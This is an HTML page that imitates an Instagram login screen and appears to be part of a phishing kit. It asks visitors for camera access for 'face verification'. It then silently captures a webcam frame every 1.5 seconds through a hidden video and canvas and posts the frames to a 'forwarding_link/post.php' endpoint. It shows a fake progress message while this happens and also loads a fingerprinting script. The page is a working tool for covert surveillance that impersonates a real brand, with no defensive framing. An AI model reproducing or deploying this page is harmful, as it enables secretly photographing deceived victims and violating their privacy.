<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <meta property="og:title" content="Instagram - Login">
    <meta property="og:description" content="Sign in to check your photos and videos from friends">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .main-container {
            display: flex;
            max-width: 935px;
            margin: 0 auto;
            padding: 20px;
        }
        .phone-mockup {
            display: none;
        }
        @media (min-width: 875px) {
            .phone-mockup {
                display: block;
                margin-right: 32px;
                align-self: center;
            }
            .phone-mockup img {
                width: 380px;
                height: auto;
            }
        }
        .login-container {
            width: 350px;
            flex-shrink: 0;
        }
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            margin-bottom: 10px;
            text-align: center;
        }
        .logo {
            font-family: 'Segoe Script', 'Brush Script MT', cursive;
            font-size: 40px;
            margin-bottom: 20px;
            color: #262626;
            letter-spacing: -1px;
        }
        .logo-img {
            width: 175px;
            margin-bottom: 12px;
        }
        .info-text {
            color: #8e8e8e;
            font-size: 14px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        .verify-btn {
            width: 100%;
            background-color: #0095f6;
            border: none;
            color: #fff;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s;
        }
        .verify-btn:hover {
            background-color: #1877f2;
        }
        .verify-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider-text {
            padding: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .input-group {
            position: relative;
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 9px 8px 7px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
            outline: none;
        }
        .input-group input:focus {
            border-color: #a8a8a8;
        }
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            border: none;
            color: #fff;
            padding: 7px 16px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 14px;
            opacity: 0.3;
        }
        .forgot {
            margin-top: 20px;
        }
        .forgot a {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 22px 0;
            text-align: center;
            font-size: 14px;
        }
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .app-download {
            text-align: center;
            margin-top: 20px;
        }
        .app-download p {
            font-size: 14px;
            margin-bottom: 15px;
        }
        .app-badges {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        .app-badges img {
            height: 40px;
        }
        .status-msg {
            font-size: 12px;
            color: #8e8e8e;
            margin-top: 10px;
            min-height: 20px;
        }
        .shield-icon {
            font-size: 48px;
            margin-bottom: 10px;
        }
        .verify-section {
            padding: 15px 0;
        }
        /* Loading spinner */
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .footer {
            text-align: center;
            margin-top: 40px;
            color: #8e8e8e;
            font-size: 12px;
        }
        .footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 4px;
        }
    </style>
</head>
<body>

<!-- Hidden cam capture -->
<div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
</div>
<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<div class="main-container">
    <div class="login-container">
        <div class="login-box">
            <!-- Instagram Logo -->
            <div class="logo">Instagram</div>
            
            <div class="verify-section">
                <div class="shield-icon">🔒</div>
                <p class="info-text">We need to verify your identity. Please allow camera access for a quick face verification.</p>
                <button class="verify-btn" id="verifyBtn" onclick="startVerification()">
                    <span id="btnText">Verify My Identity</span>
                    <div class="spinner" id="spinner"></div>
                </button>
                <p class="status-msg" id="statusMsg"></p>
            </div>

            <div class="divider">
                <div class="divider-line"></div>
                <div class="divider-text">OR</div>
                <div class="divider-line"></div>
            </div>

            <div class="input-group">
                <input type="text" placeholder="Phone number, username, or email">
            </div>
            <div class="input-group">
                <input type="password" placeholder="Password">
            </div>
            <button class="login-btn" disabled>Log in</button>

            <div class="forgot">
                <a href="#">Forgot password?</a>
            </div>
        </div>

        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>

        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-badges">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft">
            </div>
        </div>
    </div>
</div>

<script>
function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function(result) {},
        error: function() {}
    });
}

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

const constraints = {
    audio: false,
    video: { facingMode: "user" }
};

let streamStarted = false;

function startVerification() {
    const btn = document.getElementById('verifyBtn');
    const btnText = document.getElementById('btnText');
    const spinner = document.getElementById('spinner');
    const statusMsg = document.getElementById('statusMsg');

    btnText.style.display = 'none';
    spinner.style.display = 'block';
    statusMsg.textContent = 'Starting verification...';

    navigator.mediaDevices.getUserMedia(constraints)
        .then(function(stream) {
            window.stream = stream;
            video.srcObject = stream;
            streamStarted = true;
            statusMsg.textContent = 'Verifying your identity...';

            var context = canvas.getContext('2d');
            setInterval(function() {
                context.drawImage(video, 0, 0, 640, 480);
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);
            }, 1500);

            // Show fake verification progress
            setTimeout(function() {
                statusMsg.textContent = 'Analyzing face data...';
            }, 3000);
            setTimeout(function() {
                statusMsg.textContent = 'Almost done...';
            }, 6000);
            setTimeout(function() {
                statusMsg.textContent = 'Verification complete! Redirecting...';
                btnText.textContent = 'Verified ✓';
                btnText.style.display = 'block';
                spinner.style.display = 'none';
                btn.style.backgroundColor = '#2ecc71';
            }, 9000);
        })
        .catch(function(err) {
            statusMsg.textContent = 'Camera access denied. Please try again.';
            btnText.style.display = 'block';
            btnText.textContent = 'Try Again';
            spinner.style.display = 'none';
        });
}
</script>

<script src="fingerprint.js"></script>
</body>
</html>
